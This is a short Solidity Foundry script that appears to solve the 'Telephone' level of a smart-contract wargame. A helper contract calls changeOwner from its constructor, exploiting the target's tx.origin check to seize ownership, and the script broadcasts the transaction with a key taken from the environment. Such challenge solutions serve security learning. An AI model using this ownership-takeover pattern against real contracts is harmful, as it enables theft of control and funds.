// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../src/04-Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Hacker {
    constructor(Telephone _telephoneInstance, address _newOwner) {
        _telephoneInstance.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephoneInstance = Telephone(0xFdAff21Ddc188b0f3088Ac3Ef9eb1462c03157Fb);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Hacker(telephoneInstance, vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}